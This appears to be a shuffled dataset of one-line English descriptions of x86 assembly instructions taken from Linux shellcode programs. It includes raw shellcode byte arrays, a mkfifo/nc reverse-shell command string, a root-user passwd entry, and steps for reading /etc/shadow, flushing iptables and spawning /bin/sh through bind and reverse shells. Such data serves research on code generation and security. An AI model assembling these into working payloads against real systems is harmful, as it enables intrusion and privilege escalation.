push 0x6f723a30 onto the stack
zero out eax register and push it on stack
jump to the l3 label if the contents of the ax register is not equal to the contents of the bx register else jump to the while label
pick up edi content from the stack
zero out the ebx register and jump to the exit label if the contents of the eax register is not equal to the contents of the ebx register
push hexadecimal value 0x30 as a byte on stack
push 0x37373333 to the stack
load the effective address of esi+13 into esi+13
negate all bits in the word contained into ax register
define message as array of bytes and initialize it to 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68
increment ebx two times defining sys_listen = 4
transfer the hexadecimal value 0x9 into bl register
clear edx
define decoder label
copy esi content into bx register
define _loader
move 0x80 into ah
define _encodedshellcode label declare db 0x4e,0xc1,0x51,0x2f,0x58,0x3c,0xdb,0xac,0xef,0x82,0xef,0x1c,0x2a,0xd9,0xdb,0x90,0xdb,0x6b,0xef,0x61,0x3b,0x1c,0xcb,0x24,0xfb,0xd6,0xc5,0x50,0x23,0xfa,0x58,0x9c,0xc5,0xb1,0x33,0x97,0x28,0x31,0xc5,0xaa,0x43,0xf9,0x56,0xf4,0xad,0xc2,0x02,0x16,0x55,0xe3
correct the result in al register of the previous bcd subtraction operation.
save addr of stack into edx
push ebx content on stack
move 11 into the byte at address al
move the contents of the esp register into the edx register
move eax into the address [esi+47]
exchange edx contents with ecx contents
push the contents of the edi register onto the stack and point edx to the stack register
clear ecx
move 5 into eax
zero out edx and ecx register
go to _set_argv label afeter entering the byte string cmd = cat /etc/passwd;echo do__ne on stack
define _loopinghere label
go to shellcode label after entering port: db db 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77 address on stack
move dl into the byte at address [esi + 1]
move the 32-bit integer representation of 2 into the doubleword starting at the address in ebx
define global _start
add ebx to eax and store the result in eax
make kernel call to exit program
jump short to the search label
decrement the edx register by one
move the character x in ebx register
jump to the l3 label if the contents of the ax register is not equal to the contents of the bx register
push the value 0x69622f2f onto the stack and point the ebx register to the stack register
increment the contents of the eax register
define the byte string '/sbin/insmod#/tmp/o.o'
push the value 0x2f2f2f2f onto the stack and point ebx to the stack register
set the ebx register to null
left shift the contents of the edi register by 0x1 bit
define _end label
define the shellcode: "vl43ck:$6$bxwjfzor$muhuwo0mugdkwfppeydqgzpm.ytpmi/gam4lvqhp21lfnwmsj821kvjniyoodytbh.sf9ar7ciqbrccw5bgjx0:0:0:vl43ck:/tmp:/bin/bash”
return to caller
define _execute label
define _infinite label
copy the value at memory address specified by di into ax
push edx, ecx and ebx content on stack
move 0x7 to bl
execute the file
pick up ecx content from the stack
push 0x742f2f2f onto the stack
perform xor between ax and bx
push ebx contente and the byte 10 on stack
perform the xor between the current byte of the shellcode and the dl register
move esp into the address [esp+4]
push the byte +0x46 onto the stack
zero out eax, ebx, ecx and edx register
declare the incaddr label
install portable signal handler
save the byte in esi+edx+1 in bl
pick up ecx contents from the stack
decrement the ecx register and jump to the next label if the contents of the ecx register is not zero and the zero flag is zero else jump to the ecx register
dup2
push '//sh' onto the stack
get_shellcode_addr function
load __nr_execve syscall into al register
jump to label done if equal
define _zero18 label
move the value two into eax
store hexadecimal value of '777' in cx
move 0x68732f2f into the dword at the memory location [esp-8]
declare _shellcode label
move a byte from bl into memory address hexstr+edx+1
execute close sycall
mmap
compare the value in eax to the doubleword addressed by edi
swap the values of edi and eax registers
move /bin/sh into the edx register
move the number of bytes of var1 into edx
load ecx content, hexadecimal value 0x8, edx content, esi content into ecx register
define _load_data label
push hexadecimal value 0x2 on stack
define the array of bytes encodedshellcode and initialize to 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce
pop the top element of the stack into memory at the four bytes starting at location ebx
define find_egg label
define _ shell label
move 0x8b90909d into eax
load execve in eax
if the overflow flag is set, genete an int 4
perform a short unconditional jump to call_decoder_label
decrement the count register and jump to decode if not equal zero
push the socket fd onto the stack
jump to the find_egg label if the zero flag is set
define _priv_setuid label
add hexadecimal value 0x30 to esi content
load __nr_chmod into al register
move dword 0x65676760 into edx
left shift the contents of al by 4 bit positions
push struct pointer
define the byte string '0ah'
section bss
call socketcall()
load the effective address of the result of the operation [ebp+20] into the esi register
mutliply eax by 0
decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the EncodedShellcode label
clear ecx and set file permissions to 777
copy hexadecimal value 0x1 into al register
zeroing ecx register
move decimal 78 into edx
save shellcode into esi
push the dword 0x6b2f7379 onto the stack
move edx into ebx
jump if greater than to label finished
exchange eax with edx content
declare _xordecode label
declare _start as global label
push the value 0x6374652f onto the stack and point edi to the stack register
jump short to the _file label
move 13 into cl
move 0x2f3e20 into eax
left shift the contents of eax 16 bits
define exit function
multiply the contents of the eax register by the contents of the ebx register
loop as long sign flag is not set
define key constant equal to 0xdeadbeef
load the sys call to write the file
define cycle label
push /bin in edi
delcare section .data
define exit_ label
define _exit label
store sockfd in esi register
subtract hexadecimal value 0x11111111 to edi content
divide eax by ecx
define a tables of bytes byte_table and initialize to 14, 15 and 22
decrement the eax register by one
move eatlen into edx
push the memory location of param 1(sizeof) onto the stack
ebx points the top pf the stack
define _encrypt label
load __nr_execve syscall into eax register
add decimal integer 5 to ebx
jump to edx
decrement the ecx register and jump to the check_even_odd label if the contents of the ecx register is not zero else jump short to the shellcode label
make the system call to suspend the process
in execute_shellcode jump short to esp
zero out the eax register and the ebx register
save fd
perform a short jmp to _cmd label
define an array of 20 initialized word
declare the set_argv label
move 4 value into cl register that represents the counter
clear edx and move 0x4 in the lowest byte of the register
push af_inet=2 as a word on stack
allocate memory for a variable
subtract 3 from bl register and go to _stage label if flag zero is not set
decrement the cl register by one
add the contents of the edi register to the contents of edi register
jump to the encoded label if the zero flag is set
jump to the two label
move ebx to eax
copy socketcall syscall number into al register
pointer to struct
move 0x978cd092 into edi
define path as the byte string '//bin/sh'
jump to the label not_found if the contents of the bl register is not zero
subtract 0x7 from the byte in esi register
push 0x0a3a7964 onto the stack
move eax into sock_reg
push dword port value = 4444
push 0x2f3a746f onto the stack
execute the syscall
call the start function
push the double word 0x2f6e6962 onto the stack
define decode function
define function_1 and execute it
zero out ecx, edx and eax
increment ebx by 1. ebx = sys_socket = 1.
define _decoder label
exit
decrement the contents of cl
copy eax into ebx register
load the string /etc/shadow in ebx register
move an ascii linefeed character into eax
push the doubleword [edx+2] to the stack
move 0x0 into ecx
jump short to the function call_shellcode
make space on stack
push 0x29 onto the stack
increment bl by 1
divide edx by 4 using right shift
move 0x782f2f into eax
subtract the value 3 from the byte in esi and negate it
save the saved socket descpritor in ebx
restore the top of the stack into the ecx register
copy the address of esi in edi
zero out the ecx register and move 0x19 into the lower byte of the register
push null
zero out the ebx register and push zero onto the stack
jump to the call_decoded label if the zero flag is set
decrement dl and jump to L3 if the result is not zero
decrement the contents of the cl register and jump to the loop_dup label if the result is not negative
shift right ax by the contents of bl and negate the word in ax
jump to the duploop label if the previous instruction clears the sign flag
push 0x2f6e6962 onto the stack
make the system call to terminate the process
jump back to start of decode
increment the contents of the dx register
set ebx to the old socket fd = 3
push the path //etc/passwd on the stack and load stack pointer to ebx
execute __nr_setreuid = 0x46 syscall
subtract 0x2e2aa163 from ebx and save the result into ebx
load address of the parameter array into ecx
subtract the value 4 from the contents of the bl register and jump to the l2 label if the result is not negative
push the dword 0x6b6e756a onto the stack
load 0x1 into bl register
increment edx and push sock_stream = 1 on stack
push ebx and ecx contents on stack
push the word 0x5445 onto the stack
add 4 to eax and jump to decode if the result is not zero
push 0x74303072 onto the stack
exchange eax with ebx contents
load the code of syscall open in al register
push the word 0x2 onto the stack
save 16, ecx contents and the saved socket descriptor (in esi) on ecx
if the contents of the eax register is negative then jump short to the label socket
load ebx content concatenating with hexadecimal value 0x6 into eax reister
define set_argv label
push 0-term, 9999, 9pl- on the stack
create a string filename and initialize to 'readme.txt'
push esi to the stack
load the stack pointer into ecx register
move decimal number 3 into ebx
jump to the label ready_to_proxy if the contents of the dl register is not zero
pop the last element pushed onto the stack into cx
push the word 0x6d6f onto the stack
move to the next word in the ebx register
push the word 0x3636 onto the stack
define F3 and call the function function_3
push the byte 0x2f onto the stack
move stack pointer to ecx
mul eax by ecx
decrement the contents of the ecx register and jump to the counter_is_now_zero label if the result is zero
push the byte 0x77 onto the stack
load the string “/bin//sh” into ebx register
define _zeroe label
increase bl by 2 so ebx=2
push 'modn' on stack
define doubleword 0xdeadbeef two times
push the value 0x4f4e2029 onto the stack
push addrlen = 0x10 on stack
restore the top of the stack into the esi register
load the effective address [ebp+28] into ecx
move hellolen into edx
load syscall sys_socket into al register
move readbuffer into ecx
exchange eax and esp content
push 1 to the stack
push 0x6567772f to the stack
move current word from encoded_shellcode to ax
define _steup label
if sf not set jump to _loop label
push sockfd saved into esi
copy 3 in bl register
initialize eax with decimal value 0
push 0x31313131 onto the stack
put the 1 in bl register
move 0x4 into ch
save the byte string 'mt.txtx' into ebx register
zero out the eax and edx register
send an interrupt software
push the hexadecimal byte value 0x1c that is the size of sockaddr_in6
define _zeero10 label
declare the function F4, negate dl and move dl to the next byte
perform the xor operation between the ax register and the value 0x4f73
zero out eax and ecx register
push the contents of ebx register onto the stack
replace first double word with string
push the doubleword 0x62732f2f to the stack
subtract 88 from the contents of al register and save the result in al
move address of stack pointer into ebx
call esi
define fupdisasm label
set listen = 4
stores al register content to location at edi
multiply ebx by 2 using left shift
jump to the value stored in the eax register
move al into ebx+7
if the zero flag is clear jump to _encoded label
call the writestring function
push the dword 0x64616568 onto the stack
load '/bin//sh\0' on ebx register
zero out eax and edx registers
push inaddr_any = 0 on the stack
copy in ecx the argument pointer
push the 0x656c6966 onto the stack
close
in decode move the current byte of the shellcode in the bl register
in call_shellcode execute the decoder routine
push 0x7268732f onto the stack
push the 0xa01a8c0 onto the stack
move decoded byte to edi
push 1 onto the stack
decrement cl and jump to L2 if the result is not equal to zero
load setreuid into al register
exchange esp content with ebx content
push the contents of the esi register onto the stack and point eax to the stack register
if the contents of the eax register is equal to the contents of the edi register then jump to the memory address 0x47
if the contents of the eax register is zero then jump to the label socket else zero out the contents of the eax register
alarm
push port number 5555 (little-endian)
move 0x3f into eax
push the word 0x7773 onto the stack
perform a logical xor between the address specified by [ecx + 116] and the bh register and save the result in [ecx + 116]
move 1 into edx
add the contents of eax to the contents of edx
push the byte 0x66 onto the stack
load the pointer to args into ecx register
load __nr_execve syscall into eax register
push ' /bin//cn' on stack
push 48 on the stack and put this value in eax, taking it from the stack
add c to eax
push 0x74 onto the stack
move ip address 127.0.0.1 into esp register
jump to the label do_next_accept if the contents of the eax register is not zero
define the byte string '0b1h'
jump to the shift_decode label if the zero flag is set
move 0x1 into ebx
increment edx by 1 for 8 times
run xor operation between the value 48 and al register contents
call the execute function
jump to the _start label if the contents of the al register is equal to the value 0xf2
push the word 0x632d onto the stack and point the esi register to the stack register
jump to the stage label if the zero flag is cleared
move encoded_shellcode pointer to edi
push the contents of the esi register onto the stack and point ecx to the stack register
access memory at the address edi and copy the byte into al register
move the address in ebx into eax
declare the formatting label
encodedshellcode is the array of bytes 0x43,0xed,0x1d,0xf4,0x40,0xfb,0x6f,0x7a,0xa9,0xe,0xb6,0xe,0xbc,0xc9,0xe3,0x7a,0xaf,0x7a,0x78,0xe,0xc5,0xda,0x76,0x6a,0x17,0x1a,0x4e,0x68,0x38,0xc2,0x99,0xfb,0x35,0x68,0x84,0xd2,0xb3,0xcb,0x7c,0x68,0x78,0xe2,0x9a,0xf5,0xe9,0x50,0xc0,0x24,0x91,0xf8,0xfe
make the system call to get the process ID
push $0x68732f2f onto the stack
define _one label
make the system calls to the kernel
jump to open_label
push sa_family_t=2 byte on stack
push 0, port number = 5555, command -ltp on stack. ecx point to the top pf the stack.
perform an unconditional short jump to read_label
load the effective address of the operation [ebp+0x59] into the ebp register
push the address of string: db "/etc/passwd" on the top of the stack, and then change the eip to the address in one_label
set cl to the stderr fd = 2
if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label
move 0x12 into bh
add ax to bx
move 93 into dl
push the byte 0x1 onto the stack
define shellcodelen equal to the length of shellcode
add 10 to the contents of eax
define _zero4 label
load listen = 4 into bl register
initialize ecx with decimal value 0
move al into memory address a_letter
push the current code location on stack and the perform an unconditional jump to the code location indicated by esp content
if zero jump to the shift_decode label
if not zero jump to the next_cycle label
push '_ezi' on stack
put db "cp /bin/sh /tmp/sh” address on stack then jump to _execute label
move 0xb33fb33f into eax
jump to the point in the code labeled finished if zero
define the _start label and jump short to call_decoder
move bufflen into edx
push port number 0x3582 as a word on stack
specify exit syscall
push the contents of ecx register onto the stack
move 04h into al
zero out eax register and insert it on the stack
move /bin/sh into the ebx register
insert in ax register the connect syscall number
subtract the byte value 8 from the contents of ebx and save the result in ebx
push the dword 0x45525649 onto the stack
put the syscall 25 into the eax register
declare the array of words word_table initialized to 134 345 564 and 123
add the contents of the eax register to the contents of esi register
if the remainder is not equal to zero jump to local label checkint
put 0-term, dwss, ap/c, te// on stack
define decoder1_label
move esp contents to ecx
push the contents of the edx register onto the stack
declare code_label
init the esi register to 0
zero out eax, ebx, ecx and edx
define o_rdonly, ecx = 0
define _cont label
clear eax and ecx
load __nr_ execve = 0x0b into al register as a byte
copy socket file descriptor from esi to ebx to feed clientid
move the contents of tmp variable into edx
define the byte value byte_value and initialize it to 150
load stack pointer into edx register
push the size of struct on stack
zero out bx register
pop esi content
push edx content on stack
move the byte at the address in [esi+ecx+1] in bl and subtract 0x7 from bl
move the contents at memory address temp4 to edx
insert in ax register the syscall _nr_socket /socket syscall number
put the syscall 0x02 into the eax register
lseek
set counter to 7 and save it in cl register
subtract 13 from "shellcode"
put 4 in bl register
push the word 0x3905 to the stack
move 0x1 into dl
push the 0x6e776f64 onto the stack
load the effective address [ebp+20] into esi
define the byte string '9ah'
zero out ebx register
move 0x68732f2f into esi
move doublewords from the stack into the general purpose registers
push ecx and esi contents on stack
define an array of 5 initialized word
load the hexadecimal word value 0x6632d in esi register
copy al content into edi register
copy hexadecimal value 0x19 to cl register
if the contents of the bl register is not zero then jump to the label not_found
push 0x203a4457 onto the stack
subtract 1564 from ax and save the result into ax
decrement ecx register
jump to the label next_page if the contents of the al register is equal to the value 0xf2
executing the reboot syscall
transfer word at the current stack top to esi and then push esi on the stack
define the _execline label
push edx contet om stack
jump to eax
add 64 to the contents of the edx register
push the word 10 to the stack
jump to shellcode
go to _shell label
in the routine R1 save the shellcode in esi
define _zero13 label
zero out the ecx register and jump to the l1 label if the contents of the ebx register is equal to the contents of the ecx register
move 0x978cd0d0 into edi
push port value = 4444 as a word
point ebp to the esp register
move /bin/sh into the ebx register
define the call_egghunter label
perform a short unconditional jump to inc_dec label
decrement eax content by 1
jump to the search_the_egg label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register
move the byte in esi into al
push the value 0 to the stack for 2 times and then push esi
clear the eax register and push its contents onto the stack
move the contents of memory address ebx+esi into ebx
perform the xor operation between cl and 0xaa and store the result in cl
load the value 0x2 into cl register
test the value of cl
define a string db and initialize to 'hello world!'
skip page if it returned efault
subtract 0x6374612e from the contents in ecx and save the result in ecx
move the byte 2ah into al
decrement dl and jump to L3 if the result is zero
clean eax and edx
ebx points to /bin//sh
push edx content two times and esi content on stack
declare _decode label
define hellolen equal to the length of the hello string
subtract the contents of bx from the contents of bx
reserve a variable filename of 255 bytes
move the contents of the al register into the contents of the bl register then subtract the value 2 from the cl register and jump to the loop label if the result is not zero
move the value 0x61722f6c into the double word starting at the address [esp-0x18]
add the hexadecimal value 0x33333333 at esi content
zero out the eax register
push the address of test.txt on the top of the stack, and then change the eip to the address in _params label
in common_commands point to the next byte in esi
load the effective address [zero_reg+3] into eax
jump to the Next_Cycle label if the result of the logical xor between the cl register and the value 0xAA is not zero
declare the download label
clear eax, ebx and edx
define len equal to the lenght of the encodedshellcode array
push the contents of the ecx register onto the stack.
specify sys_read call
jump to the instruction labeled begin
move esp into edi
make the system call lseek
define constant total_students equal to 50
push the 0x53534150 onto the stack
pick up esi register content from the stack
push the value 0x2e383631 onto the stack
put the syscall 11 into the al register
define the cont label
jump short to the shellcode label
add 0x1 from the current byte of the shellcode and negate the result
push the byte 0x10 on stack
move dl into the byte at address [ecx+92]
push the contents of the esi register onto the stack.
create the doubleword variable var_a in memory and initialize it to zero
if the first byte of the esi register is not equal to the contents of the bl register then jump to the label loop_1
push the sockfd on stack
as long as sf is not set, jump to _loop label
call returnlabel
clear eax and save in it the number of syscall dup2
load the effective address of the result of the operation [ebx+17h] into the eax register
jump to the label l1 if the contents of the al register is greater than or equal to the decimal value 9
define the _start label and jump short to stage
declare L3 and jump to the shellcode
perform an unconditional jump to _call_shellcode label
add one to the doubleword integer stored at location var
define close_syscall equal to 6
go to _zero10 label
decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else point the eax register to the stack register
define the byte string '/sbin/iptables#-f#'
move 0x02 into bl
push the value 0x61702f2f and the value 0x6374652f onto the stack and point the ecx register to the stack register
transfer the hexadecimal value 0x1c (28) into dl register
load execve syscall into eax register
push ascii sh// onto stack
add the register dl in the memory location byte_value
ecx points to the arguments address
run xor operation between ax register and the hexadeciaml value 0x7777
move 132 into dx
left shift all bits of edx 4 times
return to where the function was called
transfer esp content into ecx two times and in ebx
move m_src to eax
jump to the fillOnes label if the contents of the al register is equal to the value 0xf2
move al into the byte at address [esi+12]
clear ebx register
if the overflow flag is clear go to the address insertion_decoder+0xc
load the pointer to args into ecx register
define find_egg function
define the _start label and jump short to call_shellcode label
perfrom an unconditional jump to edx
terminate the process
move the byte at the address edi+ecx into bl
if the contents of the bl register is equal to the contents of the al register then jump to the loop_2 label else jump short to the not_found label
define _get_key label
jump to the formatting label if the result of the logical xor between the bl register and the value 0xBB is zero
reserve 1 word at location bignum
declare F4, move to the next byte in ecx and jump to L2
move the contents at memory specified by z to eax
move the function chmod in al register
subtract 0x7ff from the contents of cx register value and save the result in cx
push name onto the stack
decrement the counter ecx
define xor_decode_label
jump to the _start label
push sin6_addr on 16 byte, saved in bx, on stack
pick up edi content from stack
define _zero6 label
push ecx and esi contents on the stack
counter to loop 3 times
perform the xor operation between the byte starting at the addess in esi and the value 0x2c
declare the get label
call the atoi function
move 128 into cl
perform a short unconditional jump to _load_data label
if the contents of the eax register is equal to the contents of the ebx register then jump to the download label
jump to label modtest if below
load byte 2 into ecx register
load __nr_execve into al register
define the label 3
copy hexadeciaml value 0x19 into cl register
zero out the ebx register and jump to the exit label if the contents of the eax register is equal to the contents of the ebx register
move 0x1 into lower byte of the eax register
jump short to 0x34
move 0x30 into al
push the hexadecimal value 0x2 on stack
load the hexadecimal value 0x2 into ecx register
declare the next_addr label
move the memory address of our file contents variable into ecx
define _all label
decrement counter
close the stream file
load 1 into bl register and write syscall number into al register, then call kernel
declare _exec label
jump to loc_402B13 if the contents of the edx register is equal to 42
jump short to inc_dec
zero out the ebx register and move the next byte of the shellcode into the lower byte of the register
clear eax and ebx register
copy the byte in memory at the address [esi + eax + 1] in bl register
perform a short unconditional jump to call_decoder
go to esp address
move 0x9 into bl
jump short to 0x11
move write_syscall into al
execute the dup2 syscall
jump to the jne_start label if the doubleword starting at the address contained in the eax register is not equal to the doubleword value 0x4f904790 else jump to the eax register
define the call_shellcode label and call the decoder function
declare _rotate label
load the effective address of the result of the operation [esi + 12] into the edx register
put the syscall socketcall in al register
clear edx
go to _decoder label after entering shellcode (db 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b,0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d) address on the top of the stack
jump to the label exeunt if the contents of the ax register is not zero else jump to the label carryon
push ebx(1) onto stack (sock_stream = 1)
define fill label
push the 4 bytes at address tmp onto stack
define call_decoder label
jump to next_page if zero
put the byte in esi into dl
define chmod_call equal to 15
push the word 0x2 on stack
push the byte 0x3f onto the stack
load the effective address of the operation [bp+0x08] into the bx register
if the contents of the eax register is not zero then jump to the label _convert
jump to shellcode if bl is equal to 0xaa
left shift the contents of the edx register by 9 bits
pick up esi content from stack
push the word 0x7773 to the stack
point ecx to stack
subtract 13 from ax and save the result into ax
if the contents of the ax register is not zero then jump to the label exeunt else jump to the label carryon
call the kernel
load the effective address [esp+1] into ebx
push the parameters (0, sock_stream =1, af_inet=2) on stack
load the address at esi + 13 into edi
push the pointer v4lhost on stack
do no operation
perform logical and between ax and 1
perform an unconditional jump to call_decoder
left rotate the byte in esi 1 time
move the byte in eax to cl
make syscall to terminate the program
create the doubleword variable y in memory and initialize it to zero
declare the stageaddress label
transfer 5 into al register
increment al register of 2
push 0x4c4c4128 onto the stack
load the effective address of the operation [ebx+0xb] into the eax register
saves socket descriptor from eax into esi register
clear ecx and eax
use stdin
push the 0x70692f6e onto the stack
put /bin/sh into ecx
copy the double word in esi register into the space memory at the address esi+0xc
move 0x16c into ax
push the byte 0x05 onto the stack
in the decode function jump to lowbound label if the current byte of the shellcode is lower than 0x7 else subtract 0x7 from the byte of the shellcode and jump to common_commands
move 0x7f into the byte at address [esp]
push the value 0x16 onto the stack
push the 0x204c4c41 onto the stack
move 8bytes of "shellcode" to mm1
ebx(5) = sys_accept = accept()
define the byte string google and initialize it to '127.1.1.1 google.com'
push 0x3458652e onto the stack
push 0x61702f63 onto the stack
if the byte starting at the address contained in the esi register is lower than the byte value 0x7 then jump to the lowbound label else subtract the byte value 0x7 from byte starting at the address contained in the esi register
declare the reading label
push the dword 0x73656c62 onto the stack
decrease ebx by 1
subtract the value 4 from the esp register and save the result in esp
declare a byte and initialize it to 0x80
compare if esi is equal to 10
call the _params function
define the array of bytes shellcode 0x3e, 0xcd, 0x5d, 0x96, 0xef, 0x75, 0x3c, 0x3c, 0x80, 0x75, 0x75, 0x3c, 0x6f, 0x76, 0x7b, 0x96, 0xf0, 0x5d, 0xbd, 0x18, 0xda, 0x8d
perform a short unconditional jump to _shellcode
jump to edi (our shellcode) if both eggs are found
compare whether the edx register has reached 10
load the real ip address in the stack
load edi content into ecx register
clear ebx register
perform a bitwise and on the contents of the eax register
insert null in edx and ecx
define section .data
push “/etc/sudoers” on stack
subtract 0x7ff from the contents in cx and save the result in cx
increment the contents of the esi register
init eax 0
move 2 into the single byte at memory location ecx
push the byte 1 onto the stack
push edx to the stack
define the cmd label
move 0x4 into bl
push eax onto the stack
add 0x33 to the contents in al and save the result in al
load __nr_socketcall syscall into al register
decrement ecx and jumps to the next label if ecx is not zero and the zero flag is equal to zero
define _retry label
push the word 2 onto the stack and point ecx to the stack register
jump to the _start label if the zero flag is cleared
put the syscall 0x1f into the eax register
exchange edx with eax
move the byte at the memory location specified by the operation [eax+1] into dl
read the hexadecimal value 0x10 and place it in al register
define the code label
push ip adreess as hexadecimal value 0x101017f on stack
define the array of bytes encodedshellcode and initialize to \xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xaa\x75\x10\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xed\xe8\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x68\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x89\xaa\xe3\xaa\x50\xaa\x89\xaa\xe2\xaa\x53\xaa\x89\xaa\xe1\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa\xbb\xbb
push the byte 70 onto the stack
perform logical or between the cx register and 0xfff
invoke subroutine accept
zero out eax register and push its contents on the stack
subtract 0x7 to bl
if the doubleword starting at the address contained in the eax register is not equal to the doubleword value 0x4f904790 then jump to the jne _start label else jump to the eax register
copy edi content as a double word into memory space at the address esp-8
xoring al register with the byte contained into the space memory at the address edi
in the function F1 negate cl and increment cl to the next byte
point to the next word in the ebx register
add 0x1 from the byte at the address esi and negate the result
negate all the bits of the ecx register
set edx = 0
left shift all bits of esi 2 times
move 30 to the cl register
define _zero2 label
move 4 into bl
zero out edx and push it on stack
push zero on the stack
define word3 uninitialized unsigned word
move the contents of the al register at the memory location specified by the operation [bp+0x0a]
increment ebx content
define _zero5 label
save eax content into esi
clear eax
load read syscall number into al register
declare the push_cmd label
push the contents of the eax register onto the stack and point edx to the stack register
increment the contents of the al register
jump to the label l2 if the contents of the cl register is greater than or equal to the decimal value 12
shift right bx by the contents of cl and negate the contents of bx
declare the egghunter label
declare the ruotine D3 and add the value 5 to the current byte of the shellcode
save dl content into the space memory at the address ebx + 6
if the unsigned contents of the al register is lower than the unsigned contents of the bl register then jump to the label l2
push eax and the hexadecimal value 0x30 on the stack
define call_decoded_label
load the effective address of esp into ebx
define _zero19 label
declare an array of six words each initialized with the numbers 34 45 56 67 75 89
load __nr_execve syscall into al register
transfer esp contents into ecx register
save sock result from eax into esi
exchange ecx with edx
perform the xor operation between dl and 0xbb and store the result in dl
subtract the byte 0x1 from the contents of the esp register
load chmod syscall number into al register
move hexadecimal value 0x5 to ch register
declare an unlabeled byte initialized to 0x80
move the contents at the memory location specified by the result of the operation [ebp-8] into the ebx register
jump to the dup2 label if the previous instruction clears the sign flag
move the contents of y into ecx
add 3 to al register
save old base pointer
push hexadecimal value 0x2faa2faa on stack
define msg2 as the byte string 'passwd'
divide eax by ecx the result of the division is stored in eax and the remainder in edx
subtract the byte 3 from the contents of the ebx register
push the dword 0x6e69922f onto the stack
load the socketcall number 102 on eax register
returnlabel label
copy the value 1 into bl register
go to _write label after entering google address on the top of the sack
push the 0x6e69622f onto the stack
push the word 0644o onto the stack
zero out eax and move 0x3 in the lowest byte of the register
multiply the contents of eax by the 32-bit contents of the memory location tmp
move variable len to edx
move the pointer to the shellcode into edi
subtract the byte in esi from the bl register
jump short to the decode label if the zero flag is cleared
copy the byte in memory at the address [esi+eax] in bl register
define the function D4 and perform the xor operation between the byte of the shellcode and the 0x12 value
run xor operation between ax register and the hexadecimal value 0x6e696230
define _gotocall label
execute chmod
jump to _exec label
declare the here label
make esi register point to shellcode
move 0xb5 into al
declare the decoder label
move the contents of the esi register into the dword at the memory location [esp-4]
store the shellcode in the esi register and copy it into ax
move the contents of the esp register into the ecx register
negate edi
add 0x31179798 to the contents in eax and save the result in eax
push the address of message on the top of the stack, and then change the eip to the address in _exec label
push null in the edx position
move cl into the address [esp + 1]
push the dword 0x6d6f646e onto the stack
push the byte 0x01 onto the stack
declare global _start and _start label
push eax, ecx and esi on the stack and then load the stack pointer in ecx register
jump to the address of shellcode_label
compare the contents stored at ebp+arg_0 with 1
push the word 0x662d onto the stack and point the edi register to the stack register
move the byte at the address 2h into al
pop eax from stack
load the object at the address 1000h into the ax register
compare eax to zero
push 0x68732f6e onto the stack
define next_aaddr label
push the value 0x1a to the stack
jump to the callpop label
push sin6_addr, saved in eax, on stack
perform a logical xor between the al register and 0e9h and save the result in al
perform a logical xor operation between eax and 0x7575
declare decoder label
if the contents of the eax register is not zero then jump to the label exit_on_error
declare three doubleword values initialized to 1 2 and 3 at address z
push the byte 11 onto the stack
define shellcode as array of bytes 0x62,0x60,0xa0,0x34,0x5e,0x97,0xe6,0x34,0xd0,0x97,0xc4,0xb4,0xdc,0xc4,0xc7,0x28,0x13,0x71,0xa6,0xc4,0xc3,0x58,0x16,0xe6,0x01
execute the syscall socketcall
jump to the label old_dirent if the contents of the eax register is negative
move the contents of the eax register into the ebx register
push edi onto the stack
stat
declare section. text, global _start and _start label
move the memory offset table+esi*4 into ax
insert execve code in al register
store address of /usr/bin/ncat in aaaa
jump short to main
define _zeroc label
move the contents of esp into ecx
move b to eax
declare the set_mark label
in the function F4 negate dl and point to the next byte in the dl register
push the hexadecimal value 0xffff on stack
move syscall close in al register
load eax and ebx contents chained into ecx register
push the value 0x6873732f and the value 0x6374652f onto the stack and point the ebx register to the stack register
define _done label
backup edx into ecx
push the contents of the edi register onto the stack and point ebx to the stack register
go to _writestring label after entering the byte string "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | /bin/nc localhost 9999 > /tmp/fr" address on the top of the stack
move eax by inserting it in the stack in ecx extracting it from the stack
copy ebp content into double word at the addresses edx-0x55af551d, edx-0x55ac551e, edx-0x554f551f
decrement ecx and jumps to the 3 label unless decrementing ecx caused its value to become zero
clear edx and eaz registers
jump to the label socket if the contents of the eax register is zero
decrement dl
move bl into the byte at address [esi]
define _zero16 label
if the contents of the al register is equal to the value 0xf2 then jump to the _start label else move the value 0x50905090 into the eax register
push ecx and esi contents
shift the ax register to right by one bit
declare the format label
zero out eax register
return to our program
execve system call number 11
increment bx
null terminate /usr/bin/ncat
move to the next byte in the shellcode and jump short to L2
jump short to the call_shellcode label
clear eax and ecx registers
perform a xor operation between ax and 0x539 and save the result in ax
copy the code of the syscall write into al register
move 0x33392e31 into eax
jump to the code location labeled loop if the operands of the previous comparison are equal
load the byte sock_stream = 1 into ebx register then push ebx content on stack
push the doubleword 0x62732f2f onto the stack and point the ebx register to the stack register
push 0777 on stack
load the effective address of esi+2 into esi
add the contents of esi to the contents of eax
clear eax, ebx and ecx
perform a short jump to _decode label and repeat the decoding process for the next word!
move 9 into cl
move the byte 3h into al
declare a constant size and set equal to 50000
push the byte 25 onto the stack
declare the wrap_around label
move al into the byte at address [esi+21]
declare global start
